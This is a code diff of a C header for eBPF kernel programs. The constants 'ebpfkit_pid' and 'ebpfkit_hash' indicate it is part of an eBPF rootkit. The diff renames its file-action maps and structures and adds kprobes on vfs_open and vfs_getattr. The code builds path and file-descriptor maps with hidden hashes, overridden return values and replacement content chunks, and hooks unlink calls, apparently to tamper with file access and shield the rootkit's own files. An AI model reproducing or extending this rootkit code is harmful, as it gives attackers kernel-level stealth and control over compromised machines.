@@ -8,14 +8,14 @@
 #ifndef _FS_ACTION_H_
 #define _FS_ACTION_H_
 
-struct bpf_map_def SEC("maps/fs_action_progs") fs_action_progs = {
+struct bpf_map_def SEC("maps/fa_action_progs") fa_action_progs = {
     .type = BPF_MAP_TYPE_PROG_ARRAY,
     .key_size = sizeof(u32),
     .value_size = sizeof(u32),
     .max_entries = 20,
 };
 
-struct fs_action_t
+struct fa_action_t
 {
     u64 id;
     s64 return_value;
@@ -23,31 +23,31 @@ struct fs_action_t
     u64 hidden_hash;
 };
 
-struct fs_fd_action_t
+struct fa_fd_action_t
 {
     u64 fd;
-    struct fs_action_t action;
+    struct fa_action_t action;
 };
 
-struct bpf_map_def SEC("maps/fs_fd_actions") fs_fd_actions = {
+struct bpf_map_def SEC("maps/fa_fd_actions") fa_fd_actions = {
     .type = BPF_MAP_TYPE_LRU_HASH,
     .key_size = sizeof(u64),
-    .value_size = sizeof(struct fs_fd_action_t),
+    .value_size = sizeof(struct fa_fd_action_t),
     .max_entries = 4096,
     .pinning = 0,
     .namespace = "",
 };
 
-struct fs_fd_key_t
+struct fa_fd_key_t
 {
     u64 fd;
     u32 pid;
     u32 padding;
 };
 
-struct fs_fd_attr_t
+struct fa_fd_attr_t
 {
-    struct fs_action_t action;
+    struct fa_action_t action;
 
     u64 override_chunk;
 
@@ -57,54 +57,54 @@ struct fs_fd_attr_t
     u64 kmsg;
 };
 
-struct bpf_map_def SEC("maps/fs_fd_attrs") fs_fd_attrs = {
+struct bpf_map_def SEC("maps/fa_fd_attrs") fa_fd_attrs = {
     .type = BPF_MAP_TYPE_LRU_HASH,
-    .key_size = sizeof(struct fs_fd_key_t),
-    .value_size = sizeof(struct fs_fd_attr_t),
+    .key_size = sizeof(struct fa_fd_key_t),
+    .value_size = sizeof(struct fa_fd_attr_t),
     .max_entries = 4096,
     .pinning = 0,
     .namespace = "",
 };
 
-struct fs_path_key_t
+struct fa_path_key_t
 {
     u64 hash;
     u64 pos;
 };
 
-struct fs_path_attr_t
+struct fa_path_attr_t
 {
     u64 fs_hash;
     u64 comm_hash;
-    struct fs_action_t action;
+    struct fa_action_t action;
 };
 
-struct bpf_map_def SEC("maps/fs_path_attrs") fs_path_attrs = {
+struct bpf_map_def SEC("maps/fa_path_attrs") fa_path_attrs = {
     .type = BPF_MAP_TYPE_HASH,
-    .key_size = sizeof(struct fs_path_key_t),
-    .value_size = sizeof(struct fs_path_attr_t),
+    .key_size = sizeof(struct fa_path_key_t),
+    .value_size = sizeof(struct fa_path_attr_t),
     .max_entries = 4096,
     .pinning = 0,
     .namespace = "",
 };
 
-struct fs_fd_content_key_t
+struct fa_fd_content_key_t
 {
     u64 id;
     u32 chunk;
     u32 padding;
 };
 
-struct fs_fd_content_t
+struct fa_fd_content_t
 {
     u64 size;
     char content[64];
 };
 
-struct bpf_map_def SEC("maps/fs_fd_contents") fs_fd_contents = {
+struct bpf_map_def SEC("maps/fa_fd_contents") fa_fd_contents = {
     .type = BPF_MAP_TYPE_HASH,
-    .key_size = sizeof(struct fs_fd_content_key_t),
-    .value_size = sizeof(struct fs_fd_content_t),
+    .key_size = sizeof(struct fa_fd_content_key_t),
+    .value_size = sizeof(struct fa_fd_content_t),
     .max_entries = 4096,
     .pinning = 0,
     .namespace = "",
@@ -133,7 +133,7 @@ __attribute__((always_inline)) u64 get_fs_hash(struct dentry *dentry)
     return hash;
 }
 
-__attribute__((always_inline)) int path_attr_matches(struct fs_path_attr_t *path_attr, struct dentry *dentry) {    
+__attribute__((always_inline)) int fa_path_attr_matches(struct fa_path_attr_t *path_attr, struct dentry *dentry) {    
     if (path_attr->fs_hash && path_attr->fs_hash != get_fs_hash(dentry))
         return 0;
 
@@ -144,7 +144,7 @@ __attribute__((always_inline)) int path_attr_matches(struct fs_path_attr_t *path
 }
 
 
-__attribute__((always_inline)) struct fs_path_attr_t *get_path_attr(struct dentry *dentry)
+__attribute__((always_inline)) struct fa_path_attr_t *get_path_attr(struct dentry *dentry)
 {
     struct qstr qstr;
     struct dentry *d_parent;
@@ -152,7 +152,7 @@ __attribute__((always_inline)) struct fs_path_attr_t *get_path_attr(struct dentr
     char name[FS_MAX_SEGMENT_LENGTH + 1];
     int end = 0;
 
-    struct fs_path_key_t key = {
+    struct fa_path_key_t key = {
         .hash = FNV_BASIS,
     };
 
@@ -177,12 +177,12 @@ __attribute__((always_inline)) struct fs_path_attr_t *get_path_attr(struct dentr
         key.hash = FNV_BASIS;
         update_hash_str(&key.hash, name);
 
-        struct fs_path_attr_t *path_attr = bpf_map_lookup_elem(&fs_path_attrs, &key);
+        struct fa_path_attr_t *path_attr = bpf_map_lookup_elem(&fa_path_attrs, &key);
         if (!path_attr)
             key.pos = 0;
         else
         {
-            if (path_attr->action.id && path_attr_matches(path_attr, dentry))
+            if (path_attr->action.id && fa_path_attr_matches(path_attr, dentry))
                 return path_attr;
             key.pos++;
         }
@@ -196,7 +196,7 @@ __attribute__((always_inline)) struct fs_path_attr_t *get_path_attr(struct dentr
     return 0;
 }
 
-__attribute__((always_inline)) int access_path(struct path *path)
+__attribute__((always_inline)) int fa_access_path(struct path *path)
 {
     u64 ebpfkit_pid;
     LOAD_CONSTANT("ebpfkit_pid", ebpfkit_pid);
@@ -208,24 +208,22 @@ __attribute__((always_inline)) int access_path(struct path *path)
     struct dentry *dentry;
     bpf_probe_read(&dentry, sizeof(dentry), &path->dentry);
 
-    struct fs_path_attr_t *path_attr = get_path_attr(dentry);
+    struct fa_path_attr_t *path_attr = get_path_attr(dentry);
     if (!path_attr)
         return 0;
 
-    struct fs_fd_action_t fd_action = {
+    struct fa_fd_action_t fd_action = {
         .action = path_attr->action,
     };
-    bpf_map_update_elem(&fs_fd_actions, &pid_tgid, &fd_action, BPF_ANY);
+    bpf_map_update_elem(&fa_fd_actions, &pid_tgid, &fd_action, BPF_ANY);
 
     return 0;
 }
 
-static __attribute__((always_inline)) int handle_unlink(struct pt_regs *ctx, const char *filename)
+static __attribute__((always_inline)) int fa_handle_unlink(struct pt_regs *ctx, const char *filename)
 {
     u64 ebpfkit_hash;
     LOAD_CONSTANT("ebpfkit_hash", ebpfkit_hash);
-
-    bpf_printk("EEEE: %lu\n", ebpfkit_hash);
 
     if (!ebpfkit_hash)
         return 0;
@@ -260,7 +258,7 @@ int __x64_sys_unlink(struct pt_regs *ctx)
     const char *filename = NULL;
     bpf_probe_read(&filename, sizeof(filename), &PT_REGS_PARM1(rctx));
 
-    return handle_unlink(ctx, filename);
+    return fa_handle_unlink(ctx, filename);
 }
 
 SEC("kprobe/__x64_sys_unlinkat")
@@ -271,7 +269,21 @@ int __x64_sys_unlinkat(struct pt_regs *ctx)
     const char *filename = NULL;
     bpf_probe_read(&filename, sizeof(filename), &PT_REGS_PARM2(rctx));
 
-    return handle_unlink(ctx, filename);
+    return fa_handle_unlink(ctx, filename);
+}
+
+SEC("kprobe/vfs_open")
+int _vfs_open(struct pt_regs *ctx)
+{
+    struct path *path = (struct path *)PT_REGS_PARM1(ctx);
+    return fa_access_path(path);
+}
+
+SEC("kprobe/vfs_getattr")
+int _vfs_getattr(struct pt_regs *ctx)
+{
+    struct path *path = (struct path *)PT_REGS_PARM1(ctx);
+    return fa_access_path(path);
 }
 
 #endif
